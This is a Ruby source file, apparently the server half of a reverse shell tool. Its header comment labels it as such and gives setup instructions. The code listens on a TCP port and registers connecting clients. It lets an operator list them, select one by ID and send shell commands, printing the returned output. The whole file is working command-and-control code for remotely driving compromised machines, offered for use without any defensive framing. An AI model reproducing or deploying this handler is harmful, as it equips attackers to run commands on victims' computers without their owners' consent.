#
#  simple ruby reverse shell script ( a piece of my old garbage computer )
#  Server version -- Usage: replace your ipv4 on ip_address and open your selected port then you can run the server and it should works fine.  
#

require 'socket'
require 'colorize'
require 'open3'

class Server

	def initialize(host, port)
		@host			= host
		@port 			= port
		@connections 	= {}
		@user_counter 	= 0
		trap("INT") { puts "[+]".cyan + " Server shutting down ..."; exit}
	end

	def add_client(client)
		port, ip = Socket.unpack_sockaddr_in(client.getpeername)		
		puts "\nA connection established from [#{"ip".upcase.cyan}: #{ip}\t#{"port".upcase.cyan}: #{port}]"
		@connections[@user_counter] = {client: client, :ip => ip, :port => port}
		@user_counter += 1
	end

	def clients
		return @connections
	end

	def help
		puts "Usage: ".yellow
		puts "\thelp: print help and usages"
		puts "\tlist: print out all the clients"
		puts "\tselect: select an client to communicate with it\n\t\t" + "Example: select 14".cyan
		puts "\tclose: for closing the conncetions"
	end

	def switch_client(id)
		client = @connections[id][:client]
		puts "#{"client:".upcase.cyan} #{@connections[id][:client]}"	
		begin
			print "SHELL".yellow.bold + " ~".white.bold + "> ".cyan.bold
			while cmd2 = gets.chomp
				begin
					if cmd2 == "close"
						client.close
						puts "client succesfully closed".upcase.green
						switch_controller			
					else
						client.puts "#{cmd2.chomp}"
					      while line = client.gets
					        	break if line.chomp == "END\0"
					        	puts "#{line}"
					      end
						print "SHELL".yellow.bold + " ~".white.bold + "> ".cyan.bold
					end
				rescue Exception => e
					puts "Error in: #{e}".red
					puts "\tBacktrace: #{e.backtrace}"
				end
			end
		rescue Exception => e
			puts "Error in: #{e}"
		end
	end

	def switch_controller
		print "> ".cyan
		while cmd1 = gets.chomp
			case cmd1
			when "list"
				if clients.size != 0
					clients.each do |key, val|
						puts "#{"ID:".cyan} #{key} - #{"IP".cyan}: #{val[:ip]} - #{"PORT".cyan}: #{val[:port]} - #{"SOCKET".cyan}: #{val[:client]}"
					end
				else
					puts "no one has connected yet".upcase.yellow
				end
			when "help"
				help
			when /select (.+)/i
				switch_client($1.to_i)
			else
				help
			end
			print "> ".cyan
		end
	end

	def run!
		while 1
			server = TCPServer.open(@host, @port)
			puts "[+]".cyan + " Socket succesfully created!"
			puts "[+]".cyan + " Listening on port #{@port} ..."
			while 1
				Thread.new(server.accept) do |client|
					add_client(client)
					switch_controller
				end
			end
		end
	end

end

Server.new('localhost', 8000).run!